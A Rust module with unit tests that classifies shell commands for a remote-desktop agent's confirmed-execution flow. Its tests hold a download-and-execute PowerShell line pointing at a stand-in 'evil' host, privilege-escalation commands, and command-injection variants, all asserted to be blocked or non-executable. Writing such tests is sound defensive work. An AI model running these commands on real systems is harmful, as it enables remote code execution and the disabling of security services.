//! Server-side exec risk classification for confirmed execution.
//!
//! Pure, I/O-free classification of an [`ExecInput`] into a
//! [`CommandClassification`] plus, for an executable match, an immutable
//! [`ExecPlanDraft`] ready to seal into an `ExecPlan` once approved. The daemon
//! confirm flow (a later step) calls [`classify_command`] at preview time and
//! stores the returned draft unchanged.
//!
//! Decision order (each step is the safe-by-default direction):
//! 0. **Blocklist** on the raw command → `Blocked` (hard deny). Matched against
//!    the effective set the caller passes — the built-in floor by default, or the
//!    manager-synced built-in-minus-disabled ∪ custom set on the runtime path.
//! 1. **Template classification**; tokenize and try built-in/operator templates.
//! 2. **Policy fallback**; `TemplateOnly` rejects an off-template command, while
//!    `OwnerInteractive` may produce a `Critical` free-form draft for an
//!    explicitly supported shell after structural validation.
//!
//! Only a template match or the explicit owner-interactive fallback yields an
//! executable classification, and even then execution requires an explicit user
//! approval downstream — there is no automatic path.

#[cfg(test)]
mod acceptance;
mod templates;
mod tokenize;

use desk_agent_protocol::authz::ExecAdmissionPolicy;
use desk_agent_protocol::command_blocklist::{BlocklistRule, blocklist_match};
use desk_agent_protocol::command_template::SyncedCommandTemplate;
use desk_agent_protocol::exec::{
    CommandClassification, ExecContainmentSnapshot, ExecDecision, ExecEffect, ExecExecutionBasis,
    ExecPlanDraft, ExecShellKind, ExecutionPrincipal,
};
use desk_agent_protocol::exec_policy::{
    build_exact_argv_draft, builtin_blocklist, fingerprint_for_principal,
};
use desk_agent_protocol::{ExecInput, ExecTarget, RiskLevel};

pub use desk_agent_protocol::exec_policy::ExecLimits;
pub use templates::{CommandForm, command_forms};

/// Maximum UTF-8 byte length accepted for an owner-confirmed free-form command.
pub const MAX_FREEFORM_COMMAND_BYTES: usize = 16 * 1024;

/// Result of classifying an exec request.
pub struct ClassifyOutcome {
    pub classification: CommandClassification,
    /// `Some` iff `classification.decision == ConfirmRequired`: the immutable
    /// plan draft to store in the pending-approval store and later seal into an
    /// `ExecPlan`.
    pub draft: Option<ExecPlanDraft>,
}

/// Classify an exec request against the built-in whitelist templates only, using
/// the compiled-in built-in blocklist floor. Pure and I/O-free. Single-device /
/// open-source path: no operator templates, no manager-synced blocklist.
pub fn classify_command(input: &ExecInput) -> ClassifyOutcome {
    classify_command_core(input, &[], builtin_blocklist())
}

/// Classify against the built-in templates unioned with operator templates, using
/// the compiled-in built-in blocklist floor. Retained for callers that have not
/// yet plumbed an effective (manager-synced) blocklist; equivalent to
/// [`classify_command_with_all`] with the built-in floor.
pub fn classify_command_with(
    input: &ExecInput,
    operator: &[SyncedCommandTemplate],
) -> ClassifyOutcome {
    classify_command_core(input, operator, builtin_blocklist())
}

/// Classify against the built-in templates unioned with operator templates, using
/// a caller-supplied **effective** blocklist (the manager's built-in-minus-disabled
/// ∪ custom set, or the daemon's cached snapshot). This is the manager/daemon
/// runtime path: because Step 0 matches against exactly this set — never a second
/// compiled-in pass — a rule the admin disabled is genuinely absent, and custom
/// rules are honored.
pub fn classify_command_with_all(
    input: &ExecInput,
    operator: &[SyncedCommandTemplate],
    effective_blocklist: &[BlocklistRule],
) -> ClassifyOutcome {
    classify_command_core(input, operator, effective_blocklist)
}

/// Classify with an explicit trusted-central admission policy.
///
/// Callers must derive `admission_policy` from authenticated owner state; it is
/// never accepted from the public command payload.
pub fn classify_command_with_policy(
    input: &ExecInput,
    operator: &[SyncedCommandTemplate],
    effective_blocklist: &[BlocklistRule],
    admission_policy: ExecAdmissionPolicy,
) -> ClassifyOutcome {
    classify_command_core_with_policy(input, operator, effective_blocklist, admission_policy)
}

/// Shared classification core. The decision order is the safe-by-default one:
///
/// - **Step 0** — blocklist (hard deny) against the **passed** `effective_blocklist`
///   only. There is no separate compiled-in blocklist pass here, so disabling a
///   built-in rule (reflected in `effective_blocklist`) actually removes it; a
///   hit is `Blocked` and outranks every whitelist match.
/// - **Step 1** — tokenize and try the built-in whitelist. A full match yields
///   `ConfirmRequired` + a rendered template draft.
/// - **Step 2** — operator exact-argv templates fill the remaining template gap
///   (purely additive; never override a `Blocked` verdict or a built-in match).
/// - **Step 3** — `TemplateOnly` rejects an off-template command;
///   `OwnerInteractive` may instead create a Critical free-form draft after its
///   structural checks.
///
/// An operator template is an exact-argv allowlist entry: the tokenized input must
/// equal the template's `argv`, and the executed plan *is* that argv (a direct
/// spawn, no shell, no parameter substitution). Risk derives from the template's
/// effect; the policy `max_risk` ceiling still applies downstream.
pub fn classify_command_core(
    input: &ExecInput,
    operator: &[SyncedCommandTemplate],
    effective_blocklist: &[BlocklistRule],
) -> ClassifyOutcome {
    classify_command_core_with_policy(
        input,
        operator,
        effective_blocklist,
        ExecAdmissionPolicy::TemplateOnly,
    )
}

fn classify_command_core_with_policy(
    input: &ExecInput,
    operator: &[SyncedCommandTemplate],
    effective_blocklist: &[BlocklistRule],
    admission_policy: ExecAdmissionPolicy,
) -> ClassifyOutcome {
    let command = input.command.as_str();

    // Step 0: blocklist (hard deny) against the effective set, on the raw command.
    if desk_agent_protocol::exec_policy::privilege_trampoline(command) {
        return ClassifyOutcome {
            classification: CommandClassification {
                risk: RiskLevel::Blocked,
                matched_template: None,
                impact: "Blocked: privilege-escalation trampolines are never executable"
                    .to_string(),
                decision: ExecDecision::Blocked,
                effect: None,
            },
            draft: None,
        };
    }
    if let Some(category) = blocklist_match(effective_blocklist, &command.to_ascii_lowercase()) {
        return ClassifyOutcome {
            classification: CommandClassification {
                risk: RiskLevel::Blocked,
                matched_template: None,
                impact: format!("Blocked: matches a prohibited pattern ({category})"),
                decision: ExecDecision::Blocked,
                effect: None,
            },
            draft: None,
        };
    }

    // Only a shell target is executable; a domain-tool target is not.
    let ExecTarget::Shell { shell } = &input.target else {
        return not_executable();
    };

    // Step 1: tokenize and try the built-in whitelist. A tokenize failure does
    // not end OwnerInteractive classification because shell metacharacters are
    // valid free-form syntax; structural validation still runs before fallback.
    let tokens = tokenize::tokenize(command).ok();
    if let Some(action) = privileged_service_action(command, input) {
        let draft = privileged_service_draft(action);
        return ClassifyOutcome {
            classification: CommandClassification {
                risk: RiskLevel::Critical,
                matched_template: Some(draft.template_id.clone()),
                impact: format!(
                    "Run systemctl {} for the LCXL Remote Desk system service as administrator",
                    action.verb()
                ),
                decision: ExecDecision::ConfirmRequired,
                effect: Some(ExecEffect::Mutating),
            },
            draft: Some(draft),
        };
    }
    let table = templates::templates();
    if let Some(m) = tokens
        .as_ref()
        .and_then(|tokens| templates::match_template(&table, tokens))
    {
        let limits = ExecLimits::clamped(input);
        let (program, argv) = (m.template.render)(&m.bound);
        let cwd = input.cwd.clone();
        // Built-in slot templates run foreground under the baseline envelope.
        let containment = ExecContainmentSnapshot::default();
        let principal = ExecutionPrincipal::SessionUser;
        let fingerprint = fingerprint_for_principal(
            &program,
            &argv,
            cwd.as_deref(),
            &limits,
            &containment,
            principal,
        );

        let impact = if m.bound.is_empty() {
            m.template.impact.to_string()
        } else {
            format!("{} (target: {})", m.template.impact, m.bound.join(", "))
        };

        let draft = ExecPlanDraft {
            program,
            argv,
            cwd,
            shell: m.template.shell,
            risk: m.template.risk,
            execution_basis: ExecExecutionBasis::Template,
            principal,
            template_id: m.template.id.to_string(),
            fingerprint,
            timeout_ms: limits.timeout_ms,
            max_stdout_bytes: limits.max_stdout_bytes,
            max_stderr_bytes: limits.max_stderr_bytes,
            containment,
        };

        return ClassifyOutcome {
            classification: CommandClassification {
                risk: m.template.risk,
                matched_template: Some(m.template.id.to_string()),
                impact,
                decision: ExecDecision::ConfirmRequired,
                effect: Some(m.template.effect),
            },
            draft: Some(draft),
        };
    }

    // Step 3: operator exact-argv template fills the NotExecutable gap. A
    // defensive argv-shape check keeps a malformed entry (which can never equal a
    // tokenized input anyway) from ever producing an executable plan.
    if let Some(tokens) = tokens.as_ref()
        && !operator.is_empty()
        && let Some(t) = operator.iter().find(|t| {
            t.argv.as_slice() == tokens.as_slice()
                && desk_agent_protocol::command_template::validate_template_argv(&t.argv).is_ok()
        })
    {
        let limits = ExecLimits::clamped(input);
        // The template path does not pre-compress the request to the foreground
        // ceiling: the raw request (0 → None) feeds the layered `effective_wall_ms`,
        // so a background-whitelisted template can still resolve past 60 s. Output
        // caps stay clamped.
        let request_wall = (input.timeout_ms != 0).then_some(input.timeout_ms);
        let draft = build_exact_argv_draft(
            t,
            request_wall,
            limits.max_stdout_bytes,
            limits.max_stderr_bytes,
            input.cwd.clone(),
        );
        return ClassifyOutcome {
            classification: CommandClassification {
                risk: t.risk(),
                matched_template: Some(t.template_id.clone()),
                impact: format!("Operator template: {}", t.argv.join(" ")),
                decision: ExecDecision::ConfirmRequired,
                effect: Some(t.effect),
            },
            draft: Some(draft),
        };
    }

    match admission_policy {
        ExecAdmissionPolicy::TemplateOnly => not_executable(),
        ExecAdmissionPolicy::OwnerInteractive => freeform_draft(input, shell),
    }
}

#[derive(Clone, Copy)]
enum PrivilegedServiceAction {
    Start,
    Stop,
    Restart,
}

impl PrivilegedServiceAction {
    fn verb(self) -> &'static str {
        match self {
            Self::Start => "start",
            Self::Stop => "stop",
            Self::Restart => "restart",
        }
    }

    fn template_id(self) -> &'static str {
        match self {
            Self::Start => "linux.systemd.start.lcxl-remote-desk.v1",
            Self::Stop => "linux.systemd.stop.lcxl-remote-desk.v1",
            Self::Restart => "linux.systemd.restart.lcxl-remote-desk.v1",
        }
    }
}

/// Trusted-central copy of the three privileged template renders. The Linux root
/// daemon independently rebuilds the same ids and every executable field before
/// it prompts or launches; keeping this copy here lets manager and OSS signal
/// preview/seal an Administrator plan without importing daemon code.
fn privileged_service_action(command: &str, input: &ExecInput) -> Option<PrivilegedServiceAction> {
    if input.cwd.is_some() || !matches!(input.target, ExecTarget::Shell { .. }) {
        return None;
    }
    [
        PrivilegedServiceAction::Start,
        PrivilegedServiceAction::Stop,
        PrivilegedServiceAction::Restart,
    ]
    .into_iter()
    .find(|action| {
        ["systemctl", "/usr/bin/systemctl"]
            .into_iter()
            .any(|program| {
                command.trim() == format!("{program} {} lcxl-remote-desk.service", action.verb())
            })
    })
}

fn privileged_service_draft(action: PrivilegedServiceAction) -> ExecPlanDraft {
    let program = "/usr/bin/systemctl".to_string();
    let argv = vec![
        action.verb().to_string(),
        "lcxl-remote-desk.service".to_string(),
    ];
    let containment = ExecContainmentSnapshot {
        allow_background: false,
        required_enforcement: desk_agent_protocol::exec::RequiredEnforcement::NativeHard,
        max_processes: Some(16),
        max_memory_bytes: Some(128 * 1024 * 1024),
        cpu_max_percent: Some(50),
        io_max_bytes_per_sec: None,
        resource_profile_id: Some("linux.privileged.systemd.v1".to_string()),
        resource_profile_revision: Some(1),
    };
    let limits = ExecLimits {
        timeout_ms: 30_000,
        max_stdout_bytes: 64 * 1024,
        max_stderr_bytes: 64 * 1024,
    };
    let principal = ExecutionPrincipal::Administrator;
    let fingerprint =
        fingerprint_for_principal(&program, &argv, None, &limits, &containment, principal);
    ExecPlanDraft {
        program,
        argv,
        cwd: None,
        shell: ExecShellKind::Native,
        risk: RiskLevel::Critical,
        execution_basis: ExecExecutionBasis::Template,
        principal,
        template_id: action.template_id().to_string(),
        fingerprint,
        timeout_ms: limits.timeout_ms,
        max_stdout_bytes: limits.max_stdout_bytes,
        max_stderr_bytes: limits.max_stderr_bytes,
        containment,
    }
}

fn freeform_draft(input: &ExecInput, shell: &str) -> ClassifyOutcome {
    let command = input.command.as_str();
    if command.trim().is_empty()
        || command.len() > MAX_FREEFORM_COMMAND_BYTES
        // A free-form shell script may legitimately span multiple lines. Keep
        // CR/LF byte-for-byte in the sealed argv so the operator previews and
        // the worker executes the same script, while still rejecting control
        // characters such as NUL and tab that are outside this exec contract.
        || command
            .chars()
            .any(|c| c.is_control() && !matches!(c, '\r' | '\n'))
    {
        return invalid_freeform();
    }

    let (program, argv, shell_kind) = match shell.trim().to_ascii_lowercase().as_str() {
        "powershell" | "powershell.exe" => {
            let (program, argv) = templates::powershell_command("powershell", command.to_string());
            (program, argv, ExecShellKind::Powershell)
        }
        "pwsh" | "pwsh.exe" => {
            let (program, argv) = templates::powershell_command("pwsh.exe", command.to_string());
            (program, argv, ExecShellKind::Powershell)
        }
        "bash" => (
            "bash".to_string(),
            vec!["-lc".to_string(), command.to_string()],
            ExecShellKind::Bash,
        ),
        "sh" => (
            "sh".to_string(),
            vec!["-lc".to_string(), command.to_string()],
            ExecShellKind::Sh,
        ),
        _ => return not_executable(),
    };

    let limits = ExecLimits::clamped(input);
    let cwd = input.cwd.clone();
    let containment = ExecContainmentSnapshot::default();
    let principal = ExecutionPrincipal::SessionUser;
    let fingerprint = fingerprint_for_principal(
        &program,
        &argv,
        cwd.as_deref(),
        &limits,
        &containment,
        principal,
    );
    let draft = ExecPlanDraft {
        program,
        argv,
        cwd,
        shell: shell_kind,
        risk: RiskLevel::Critical,
        execution_basis: ExecExecutionBasis::OwnerBlocklistOnly,
        principal,
        template_id: String::new(),
        fingerprint,
        timeout_ms: limits.timeout_ms,
        max_stdout_bytes: limits.max_stdout_bytes,
        max_stderr_bytes: limits.max_stderr_bytes,
        containment,
    };

    ClassifyOutcome {
        classification: CommandClassification {
            risk: RiskLevel::Critical,
            matched_template: None,
            impact: "Owner-confirmed off-template command; only the effective blocklist and \
                     structural execution constraints were applied"
                .to_string(),
            decision: ExecDecision::ConfirmRequired,
            effect: Some(ExecEffect::Mutating),
        },
        draft: Some(draft),
    }
}

fn not_executable() -> ClassifyOutcome {
    ClassifyOutcome {
        classification: CommandClassification {
            risk: RiskLevel::High,
            matched_template: None,
            impact: "Command does not match any known safe template; run it \
                     manually in the terminal instead"
                .to_string(),
            decision: ExecDecision::NotExecutable,
            effect: None,
        },
        draft: None,
    }
}

fn invalid_freeform() -> ClassifyOutcome {
    ClassifyOutcome {
        classification: CommandClassification {
            risk: RiskLevel::High,
            matched_template: None,
            impact: "Free-form command is empty, too large, or contains an unsupported control \
                     character"
                .to_string(),
            decision: ExecDecision::NotExecutable,
            effect: None,
        },
        draft: None,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use desk_agent_protocol::authz::ExecAdmissionPolicy;
    use desk_agent_protocol::exec::{ExecEffect, ExecExecutionBasis, ExecShellKind};
    use desk_agent_protocol::exec_policy::{
        DEFAULT_OUTPUT_BYTES, DEFAULT_TIMEOUT_MS, MAX_OUTPUT_BYTES, MAX_TIMEOUT_MS,
    };

    fn shell_input(command: &str) -> ExecInput {
        ExecInput {
            target: ExecTarget::Shell {
                shell: "powershell".to_string(),
            },
            command: command.to_string(),
            cwd: None,
            timeout_ms: 0,
            max_stdout_bytes: 0,
            max_stderr_bytes: 0,
        }
    }

    #[test]
    fn whitelist_match_is_confirm_required_with_draft() {
        let out = classify_command(&shell_input("Get-Service -Name Spooler"));
        assert_eq!(out.classification.decision, ExecDecision::ConfirmRequired);
        assert_eq!(out.classification.risk, RiskLevel::Low);
        assert_eq!(out.classification.effect, Some(ExecEffect::ReadOnly));
        assert_eq!(
            out.classification.matched_template.as_deref(),
            Some("get_service_named")
        );
        let draft = out.draft.expect("draft present");
        assert_eq!(draft.execution_basis, ExecExecutionBasis::Template);
        assert_eq!(draft.program, "powershell");
        assert_eq!(draft.argv.last().unwrap(), "Get-Service -Name 'Spooler'");
        assert!(!draft.fingerprint.is_empty());
        // Unset limits clamp to defaults.
        assert_eq!(draft.timeout_ms, DEFAULT_TIMEOUT_MS);
        assert_eq!(draft.max_stdout_bytes, DEFAULT_OUTPUT_BYTES);
    }

    #[test]
    fn mutating_match_requires_confirmation_and_confirmed_capability_effect() {
        let out = classify_command(&shell_input("Restart-Service -Name Spooler"));
        assert_eq!(out.classification.decision, ExecDecision::ConfirmRequired);
        assert_eq!(out.classification.risk, RiskLevel::High);
        assert_eq!(out.classification.effect, Some(ExecEffect::Mutating));
        // The frozen capability mapping turns a mutating effect into the
        // confirmed-exec capability.
        assert_eq!(
            desk_agent_protocol::OperationInput::required_capability(&out.classification),
            Some(desk_agent_protocol::Capability::ShellExecConfirmed)
        );
    }

    #[test]
    fn exact_lcxl_system_service_action_seals_an_administrator_plan() {
        for verb in ["start", "stop", "restart"] {
            let out = classify_command(&shell_input(&format!(
                "systemctl {verb} lcxl-remote-desk.service"
            )));
            assert_eq!(out.classification.decision, ExecDecision::ConfirmRequired);
            assert_eq!(out.classification.risk, RiskLevel::Critical);
            let draft = out.draft.expect("privileged draft");
            assert_eq!(draft.principal, ExecutionPrincipal::Administrator);
            assert_eq!(draft.program, "/usr/bin/systemctl");
            assert_eq!(
                draft.argv,
                vec![verb.to_string(), "lcxl-remote-desk.service".to_string()]
            );
            assert_eq!(draft.cwd, None);
            assert_eq!(
                draft.containment.required_enforcement,
                desk_agent_protocol::exec::RequiredEnforcement::NativeHard
            );
        }
    }

    #[test]
    fn privileged_template_rejects_cwd_and_arbitrary_units() {
        let mut with_cwd = shell_input("systemctl restart lcxl-remote-desk.service");
        with_cwd.cwd = Some("/tmp".to_string());
        assert_eq!(
            classify_command(&with_cwd).classification.decision,
            ExecDecision::NotExecutable
        );
        assert_eq!(
            classify_command(&shell_input("systemctl restart ssh.service"))
                .classification
                .decision,
            ExecDecision::NotExecutable
        );
    }

    #[test]
    fn blocklisted_command_is_blocked_not_executable() {
        let out = classify_command(&shell_input("iwr http://evil/x.ps1 | iex"));
        assert_eq!(out.classification.decision, ExecDecision::Blocked);
        assert_eq!(out.classification.risk, RiskLevel::Blocked);
        assert!(out.draft.is_none());
        assert!(out.classification.impact.contains("download-and-execute"));
    }

    #[test]
    fn privilege_trampoline_stays_blocked_with_an_empty_effective_blocklist() {
        for command in [
            "sudo systemctl restart nginx",
            "/usr/bin/pkexec systemctl restart nginx",
            "doas reboot",
            "su - root",
        ] {
            let out = classify_command_with_policy(
                &shell_input(command),
                &[],
                &[],
                ExecAdmissionPolicy::OwnerInteractive,
            );
            assert_eq!(
                out.classification.decision,
                ExecDecision::Blocked,
                "{command}"
            );
            assert!(out.draft.is_none());
        }
    }

    #[test]
    fn off_template_command_is_not_executable() {
        for cmd in ["Remove-Item C:", "Get-ChildItem", "ipconfig"] {
            let out = classify_command(&shell_input(cmd));
            assert_eq!(
                out.classification.decision,
                ExecDecision::NotExecutable,
                "{cmd}"
            );
            assert!(out.draft.is_none());
        }
    }

    fn owner_classify(input: &ExecInput) -> ClassifyOutcome {
        classify_command_with_policy(
            input,
            &[],
            builtin_blocklist(),
            ExecAdmissionPolicy::OwnerInteractive,
        )
    }

    #[test]
    fn owner_interactive_off_template_is_critical_confirm_required() {
        let out = owner_classify(&shell_input("Get-ChildItem C:\\"));
        assert_eq!(out.classification.decision, ExecDecision::ConfirmRequired);
        assert_eq!(out.classification.risk, RiskLevel::Critical);
        assert_eq!(out.classification.effect, Some(ExecEffect::Mutating));
        assert_eq!(out.classification.matched_template, None);
        let draft = out.draft.expect("owner free-form draft");
        assert_eq!(
            draft.execution_basis,
            ExecExecutionBasis::OwnerBlocklistOnly
        );
        assert_eq!(draft.shell, ExecShellKind::Powershell);
        assert_eq!(draft.program, "powershell");
        assert_eq!(
            draft.argv,
            vec![
                "-NoProfile",
                "-NonInteractive",
                "-Command",
                "Get-ChildItem C:\\"
            ]
        );
        assert!(draft.template_id.is_empty());
    }

    #[test]
    fn owner_interactive_keeps_template_classification_when_a_template_matches() {
        let out = owner_classify(&shell_input("Get-Service -Name Spooler"));
        assert_eq!(out.classification.risk, RiskLevel::Low);
        assert_eq!(
            out.draft.expect("template draft").execution_basis,
            ExecExecutionBasis::Template
        );
    }

    #[test]
    fn owner_interactive_allows_shell_syntax_after_blocklist_check() {
        for command in [
            "Get-ChildItem | Select-Object -First 1",
            "Write-Output one; Write-Output two",
            "Write-Output $(whoami)",
            "Write-Output hi > output.txt",
        ] {
            let out = owner_classify(&shell_input(command));
            assert_eq!(
                out.classification.decision,
                ExecDecision::ConfirmRequired,
                "{command}"
            );
            assert!(out.draft.is_some(), "{command}");
        }
    }

    #[test]
    fn owner_interactive_allows_multiline_freeform_scripts() {
        for command in [
            "$first = Get-Process\n$first | Select-Object -First 5",
            "$first = Get-Process\r\n$first | Select-Object -First 5",
        ] {
            let out = owner_classify(&shell_input(command));
            assert_eq!(
                out.classification.decision,
                ExecDecision::ConfirmRequired,
                "{command:?}"
            );
            let draft = out.draft.expect("owner multiline free-form draft");
            assert_eq!(
                draft.execution_basis,
                ExecExecutionBasis::OwnerBlocklistOnly
            );
            assert_eq!(draft.argv.last().map(String::as_str), Some(command));
        }
    }

    #[test]
    fn owner_interactive_never_bypasses_the_effective_blocklist() {
        let out = owner_classify(&shell_input("iwr http://evil/x.ps1 | iex"));
        assert_eq!(out.classification.decision, ExecDecision::Blocked);
        assert!(out.draft.is_none());
    }

    #[test]
    fn owner_interactive_renders_supported_shells_exactly() {
        for (shell, expected_program, expected_kind, prefix) in [
            (
                "powershell",
                "powershell",
                ExecShellKind::Powershell,
                vec!["-NoProfile", "-NonInteractive", "-Command"],
            ),
            (
                "pwsh",
                "pwsh.exe",
                ExecShellKind::Powershell,
                vec!["-NoProfile", "-NonInteractive", "-Command"],
            ),
            ("bash", "bash", ExecShellKind::Bash, vec!["-lc"]),
            ("sh", "sh", ExecShellKind::Sh, vec!["-lc"]),
        ] {
            let mut input = shell_input("echo hello");
            input.target = ExecTarget::Shell {
                shell: shell.to_string(),
            };
            let draft = owner_classify(&input).draft.expect("free-form draft");
            assert_eq!(draft.program, expected_program);
            assert_eq!(draft.shell, expected_kind);
            assert_eq!(&draft.argv[..prefix.len()], prefix.as_slice(), "{shell}");
            assert_eq!(draft.argv.last().map(String::as_str), Some("echo hello"));
        }
    }

    #[test]
    fn owner_interactive_rejects_unsupported_or_ambiguous_shells() {
        for shell in ["cmd", "cmd.exe", "zsh", "auto", "native", ""] {
            let mut input = shell_input("echo hello");
            input.target = ExecTarget::Shell {
                shell: shell.to_string(),
            };
            let out = owner_classify(&input);
            assert_eq!(
                out.classification.decision,
                ExecDecision::NotExecutable,
                "{shell}"
            );
            assert!(out.draft.is_none(), "{shell}");
        }
    }

    #[test]
    fn owner_interactive_rejects_invalid_freeform_structure() {
        for command in ["", "   ", "echo\tone", "echo\0one", "echo\u{1b}one"] {
            let out = owner_classify(&shell_input(command));
            assert_eq!(
                out.classification.decision,
                ExecDecision::NotExecutable,
                "{command:?}"
            );
            assert!(out.draft.is_none(), "{command:?}");
        }
        let too_long = "a".repeat(MAX_FREEFORM_COMMAND_BYTES + 1);
        assert_eq!(
            owner_classify(&shell_input(&too_long))
                .classification
                .decision,
            ExecDecision::NotExecutable
        );
    }

    #[test]
    fn execution_basis_changes_the_full_draft_not_the_fingerprint() {
        let template = classify_command(&shell_input("Get-Service -Name Spooler"))
            .draft
            .expect("template draft");
        let mut owner = template.clone();
        owner.execution_basis = ExecExecutionBasis::OwnerBlocklistOnly;
        assert_eq!(template.fingerprint, owner.fingerprint);
        assert_ne!(template, owner);
    }

    /// The core security property: no injection variant ever produces an
    /// executable (`ConfirmRequired`) classification. Each rides a real
    /// template prefix with an injection appended, plus the canonical bypass
    /// shapes from the security model checklist.
    #[test]
    fn injection_variants_never_become_executable() {
        let variants = [
            // cmd /c wrapping
            "cmd /c Get-Service Spooler",
            // pipe / sequencing / background
            "Get-Service Spooler | Out-File x",
            "Get-Service Spooler; whoami",
            "Get-Service Spooler && whoami",
            "Get-Service Spooler & whoami",
            // command substitution
            "Get-Service $(whoami)",
            "Get-Service `whoami`",
            // redirection
            "Get-Service Spooler > out.txt",
            "Get-Service Spooler < in.txt",
            // stop-parsing + encoded command
            "Get-Service --% Spooler",
            "powershell -EncodedCommand ZQBjAGgAbwA=",
            "powershell -enc ZQBjAGgAbwA=",
            // newline / tab injection
            "Get-Service Spooler\nwhoami",
            "Get-Service Spooler\tStop-Computer",
            // alias / nested
            "iex (Get-Service Spooler)",
            // mutating verb at a protected service
            "Restart-Service WinDefend",
            "Stop-Service mpssvc",
        ];
        for cmd in variants {
            let out = classify_command(&shell_input(cmd));
            assert_ne!(
                out.classification.decision,
                ExecDecision::ConfirmRequired,
                "injection variant became executable: {cmd:?}"
            );
            assert!(
                out.draft.is_none(),
                "injection variant produced a draft: {cmd:?}"
            );
        }
    }

    #[test]
    fn domain_target_is_not_executable() {
        let input = ExecInput {
            target: ExecTarget::Domain {
                tool: "adb".to_string(),
                args: vec!["shell".to_string()],
            },
            command: "Get-Service -Name Spooler".to_string(),
            cwd: None,
            timeout_ms: 0,
            max_stdout_bytes: 0,
            max_stderr_bytes: 0,
        };
        let out = classify_command(&input);
        assert_eq!(out.classification.decision, ExecDecision::NotExecutable);
    }

    #[test]
    fn limits_are_clamped() {
        let mut input = shell_input("Get-Service -Name Spooler");
        input.timeout_ms = u32::MAX;
        input.max_stdout_bytes = 99_999_999;
        input.max_stderr_bytes = 10;
        let out = classify_command(&input);
        let draft = out.draft.unwrap();
        assert_eq!(draft.timeout_ms, MAX_TIMEOUT_MS);
        assert_eq!(draft.max_stdout_bytes, MAX_OUTPUT_BYTES);
        assert_eq!(draft.max_stderr_bytes, 10);
    }

    #[test]
    fn fingerprint_changes_with_target() {
        let a = classify_command(&shell_input("Get-Service -Name Spooler"))
            .draft
            .unwrap()
            .fingerprint;
        let b = classify_command(&shell_input("Get-Service -Name Dnscache"))
            .draft
            .unwrap()
            .fingerprint;
        assert_ne!(a, b);
    }

    fn operator_template(
        template_id: &str,
        argv: &[&str],
        effect: ExecEffect,
    ) -> SyncedCommandTemplate {
        SyncedCommandTemplate {
            template_id: template_id.to_string(),
            argv: argv.iter().map(|s| s.to_string()).collect(),
            effect,
            containment: Default::default(),
        }
    }

    #[test]
    fn builtin_baseline_is_available_even_with_no_operator_templates() {
        // The built-in templates always classify, single-machine included.
        let out = classify_command_with(&shell_input("Get-Service -Name Spooler"), &[]);
        assert_eq!(out.classification.decision, ExecDecision::ConfirmRequired);
        assert_eq!(
            out.classification.matched_template.as_deref(),
            Some("get_service_named")
        );
    }

    #[test]
    fn operator_template_makes_an_off_template_command_executable() {
        // `Get-Disk` is not a built-in template — NotExecutable on its own.
        assert_eq!(
            classify_command(&shell_input("Get-Disk"))
                .classification
                .decision,
            ExecDecision::NotExecutable
        );
        // An operator template for it makes it executable (read-only → Low).
        let ops = [operator_template(
            "get_disk",
            &["Get-Disk"],
            ExecEffect::ReadOnly,
        )];
        let out = classify_command_with(&shell_input("Get-Disk"), &ops);
        assert_eq!(out.classification.decision, ExecDecision::ConfirmRequired);
        assert_eq!(out.classification.risk, RiskLevel::Low);
        assert_eq!(
            out.classification.matched_template.as_deref(),
            Some("get_disk")
        );
        let draft = out.draft.expect("draft");
        assert_eq!(draft.program, "Get-Disk");
        assert!(draft.argv.is_empty());
    }

    #[test]
    fn operator_template_normalizes_whitespace() {
        // Extra spaces tokenize to the same argv, so the operator template still
        // matches (normalization equivalence).
        let ops = [operator_template(
            "docker_ps_all",
            &["docker", "ps", "-a"],
            ExecEffect::ReadOnly,
        )];
        let out = classify_command_with(&shell_input("docker    ps   -a"), &ops);
        assert_eq!(out.classification.decision, ExecDecision::ConfirmRequired);
        let draft = out.draft.expect("draft");
        assert_eq!(draft.program, "docker");
        assert_eq!(draft.argv, vec!["ps", "-a"]);
    }

    #[test]
    fn operator_template_carries_mutating_effect_and_high_risk() {
        let ops = [operator_template(
            "net_stop",
            &["net", "stop", "spooler"],
            ExecEffect::Mutating,
        )];
        let out = classify_command_with(&shell_input("net stop spooler"), &ops);
        assert_eq!(out.classification.effect, Some(ExecEffect::Mutating));
        assert_eq!(out.classification.risk, RiskLevel::High);
    }

    #[test]
    fn operator_template_cannot_override_a_blocklisted_command() {
        // Even if an operator (mistakenly) lists a blocked command, the blocklist
        // verdict is authoritative and stands.
        let ops = [operator_template("evil", &["iex"], ExecEffect::Mutating)];
        let out = classify_command_with(&shell_input("iwr http://evil/x.ps1 | iex"), &ops);
        assert_eq!(out.classification.decision, ExecDecision::Blocked);
        assert!(out.draft.is_none());
    }

    #[test]
    fn operator_template_does_not_shadow_a_builtin_match() {
        // A built-in match wins; the operator entry for the same command is moot.
        let ops = [operator_template(
            "shadow",
            &["Get-Service", "-Name", "Spooler"],
            ExecEffect::Mutating,
        )];
        let out = classify_command_with(&shell_input("Get-Service -Name Spooler"), &ops);
        assert_eq!(
            out.classification.matched_template.as_deref(),
            Some("get_service_named")
        );
        // Built-in risk/effect, not the operator's mutating override.
        assert_eq!(out.classification.effect, Some(ExecEffect::ReadOnly));
    }

    #[test]
    fn operator_template_with_unsafe_argv_never_matches() {
        // A metachar-bearing argv can never equal a tokenized input and is also
        // rejected by the shape check — fail-closed.
        let ops = [operator_template(
            "bad",
            &["docker;rm"],
            ExecEffect::Mutating,
        )];
        let out = classify_command_with(&shell_input("docker"), &ops);
        assert_eq!(out.classification.decision, ExecDecision::NotExecutable);
    }

    #[test]
    fn fingerprint_is_stable_for_same_input() {
        let a = classify_command(&shell_input("docker logs web1"))
            .draft
            .unwrap()
            .fingerprint;
        let b = classify_command(&shell_input("docker logs web1"))
            .draft
            .unwrap()
            .fingerprint;
        assert_eq!(a, b);
    }

    // ---- effective blocklist (classify_command_with_all) ----

    use desk_agent_protocol::command_blocklist::BlocklistMatcher;

    fn custom_substring(rule_id: &str, category: &str, pattern: &str) -> BlocklistRule {
        BlocklistRule {
            rule_id: rule_id.to_string(),
            category: category.to_string(),
            matcher: BlocklistMatcher::Substring {
                patterns: vec![pattern.to_string()],
            },
        }
    }

    #[test]
    fn custom_rule_blocks_over_a_whitelist_match() {
        // `Get-Service -Name Spooler` is a built-in whitelist match, but a custom
        // blocklist rule matching it takes precedence (Step 0 outranks Step 2).
        let effective = vec![custom_substring(
            "custom.spooler",
            "operator policy",
            "get-service",
        )];
        let out =
            classify_command_with_all(&shell_input("Get-Service -Name Spooler"), &[], &effective);
